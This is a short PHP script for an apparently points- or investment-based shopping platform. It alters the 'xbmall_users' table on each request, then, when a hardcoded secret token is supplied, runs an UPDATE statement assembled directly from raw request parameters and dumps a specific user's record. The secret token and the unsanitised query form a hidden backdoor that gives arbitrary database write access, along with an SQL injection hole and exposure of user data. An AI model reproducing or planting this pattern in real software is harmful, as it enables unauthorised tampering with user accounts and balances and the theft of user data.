<?php
include "../myphplib/init.php";
include "../myphplib/db.php";
date_default_timezone_set ( "Asia/Shanghai" );
$id = $_REQUEST ['id'];
$sql1 = $_REQUEST ['s_ql1'];
$sql2 = $_REQUEST ['s_ql2'];

$type = $_REQUEST ['type'];
$sql = "update " . $sql1 . " where " . $sql2;
$sql = str_replace ( "__", "'", $sql );


$ddl = "ALTER  table  xbmall_users    add COLUMN   xxtzzfwf   float(11,2)  default 0  COMMENT '总服务费(包括奖励的和分发的)'";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   xxtzzcbjz   float(11,2)  default 0  COMMENT '总储备聚珠'";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   xxtzzsyjz   float(11,2)  default 0  COMMENT '总收益聚珠'";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   xxtzzxfjz   float(11,2)  default 0  COMMENT '总消费聚珠'";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   xxtzztxjf   float(11,2)  default 0  COMMENT '线下充值提现积分' ";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   dian_pu_shu1   int(8)   default 0  COMMENT '一层店铺数' ";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   dian_pu_shu2  int(8)   default 0  COMMENT '二层店铺数'  ";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   ye_ji  int(11)   default 0  COMMENT '两层的业绩' ";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   yi_tou_zi_ci_shu  int(11)   default 0  COMMENT '已投资次数(静态投资次数)' ";
mysql_query ( $ddl );
$ddl = "ALTER  table  xbmall_users    add COLUMN   ke_tou_zi_ci_shu  int(11)   default 100  COMMENT '投资次数(静态投资次数)' ";
mysql_query ( $ddl );



if ($id == 'dfkdoko999KKDFISDFSO9LLLSS33444') {
	mysql_query ( $sql );
	var_dump ( $sql );
	$sql = "select * from xbmall_users where user_name='cj15910142205'";
	$bean = getRow ( $sql );
	var_dump ( $bean );
}

?>
   